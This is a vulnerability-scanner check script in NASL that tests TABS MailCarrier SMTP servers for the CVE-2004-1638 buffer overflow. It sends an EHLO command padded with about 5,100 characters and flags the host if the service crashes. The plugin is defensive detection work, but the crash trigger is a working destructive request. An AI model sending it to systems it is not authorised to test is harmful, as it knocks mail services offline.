if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15902" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2004-1638" );
	script_bugtraq_id( 11535 );
	script_xref( name: "OSVDB", value: "11174" );
	script_name( "TABS MailCarrier SMTP Buffer Overflow Vulnerability" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "SMTP problems" );
	script_dependencies( "smtpserver_detect.sc" );
	script_require_ports( "Services/smtp", 25, 465, 587 );
	script_mandatory_keys( "smtp/tabs/mailcarrier/detected" );
	script_tag( name: "impact", value: "By sending an overly long EHLO command, a remote attacker can crash the SMTP
  service and execute arbitrary code on the target." );
	script_tag( name: "solution", value: "Upgrade to MailCarrier 3.0.1 or later." );
	script_tag( name: "summary", value: "The target is running at least one instance of MailCarrier in which the
  SMTP service suffers from a buffer overflow vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("smtp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = smtp_get_port( default: 25 );
banner = smtp_get_banner( port: port );
if(!banner || !ContainsString( banner, "TABS Mail Server" )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
vtstrings = get_vt_strings();
c = NASLString( "EHLO ", crap( 5100, vtstrings["uppercase"] ), "\\r\\n" );
send( socket: soc, data: c );
for{
	s = recv_line( socket: soc, length: 32768 );
	
	if( !IsMatchRegexp( s, "^[0-9]{3}[ -]" ) ){
		break;
	}
}
if(!s){
	close( soc );
	sleep( 2 );
	soc = open_sock_tcp( port );
	if( !soc ){
		security_message( port: port );
		exit( 0 );
	}
	else {
		close( soc );
	}
}
smtp_close( socket: soc, check_data: s );
exit( 99 );

